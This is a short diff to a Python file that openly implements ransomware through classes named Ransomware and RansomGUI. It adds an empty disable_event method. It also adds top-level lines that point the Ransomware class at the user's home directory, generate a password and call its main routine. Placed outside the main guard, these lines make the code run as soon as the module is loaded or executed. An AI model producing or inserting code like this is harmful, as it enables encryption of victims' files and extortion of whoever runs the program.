@@ -221,6 +221,14 @@ class RansomGUI(Ransomware):
         else:
             self.throw_error_message()
 
+    def disable_event(self):
+        pass
+
+
+ransom = Ransomware(os.path.expanduser('~'))
+passwd = ransom.gen_pass()
+ransom.main(passwd)
+
 
 if __name__ == '__main__':
     pass
